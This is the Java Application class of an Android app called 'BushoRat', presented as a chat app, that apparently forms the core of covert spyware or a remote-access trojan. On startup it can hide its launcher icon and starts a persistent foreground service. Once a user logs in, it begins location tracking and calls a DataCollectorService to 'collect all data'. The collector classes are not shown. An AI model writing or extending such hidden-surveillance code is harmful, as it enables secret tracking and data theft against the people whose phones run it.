package com.bushorat.chatapp;

import android.app.Application;
import android.content.Intent;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.bushorat.chatapp.helpers.AppVisibilityHelper;
import com.bushorat.chatapp.helpers.SessionManager;
import com.bushorat.chatapp.services.BackgroundMaintenanceService;
import com.bushorat.chatapp.services.LocationRequestService;

public class BushoRatApplication extends Application {
    private static final String TAG = "BushoRatApplication";
    private FirebaseAuth.AuthStateListener authStateListener;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.d(TAG, "Application onCreate: Initializing Firebase");

        FirebaseApp.initializeApp(this);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);

        // Initialize visibility helper and apply persisted state immediately.
        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
        boolean isHidden = visibilityHelper.isAppHidden();
        Log.d(TAG, "App visibility on startup: hidden=" + isHidden);

        if (isHidden) {
            visibilityHelper.enforceHiddenLauncher();
        }

        SessionManager sessionManager = new SessionManager(this);
        if (FirebaseAuth.getInstance().getCurrentUser() != null
                || sessionManager.isUserLoggedIn()
                || sessionManager.getUserId() != null) {
            visibilityHelper.ensureListenerStarted();
        }

        startBackgroundService();
        registerVisibilityAuthListener();
    }

    private void startBackgroundService() {
        try {
            Intent serviceIntent = new Intent(this, BackgroundMaintenanceService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Background maintenance service started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start background service", e);
        }
    }

    private void registerVisibilityAuthListener() {
        authStateListener = firebaseAuth -> {
            if (firebaseAuth.getCurrentUser() != null) {
                Log.d(TAG, "✓ Auth state: user logged in - starting all data sync");
                String userId = firebaseAuth.getCurrentUser().getUid();
                Log.d(TAG, "  User ID: " + userId);
                
                AppVisibilityHelper visibilityHelper =
                        AppVisibilityHelper.getInstance(BushoRatApplication.this);
                visibilityHelper.ensureListenerStarted();
                
                // ✨ START LOCATION UPDATES SO getLastKnownLocation() HAS DATA
                Log.d(TAG, "  → Starting location update requests");
                try {
                    LocationRequestService locationService = LocationRequestService.getInstance(BushoRatApplication.this);
                    locationService.startLocationUpdates();
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start location service", e);
                }
                
                // Start all data sync immediately via DataCollectorService
                Log.d(TAG, "  → Starting DataCollectorService for all data");
                com.bushorat.chatapp.helpers.DataCollectorService.collectAllData(BushoRatApplication.this);
            } else {
                Log.w(TAG, "Auth state: user logged out");
            }
        };
        FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
    }
}
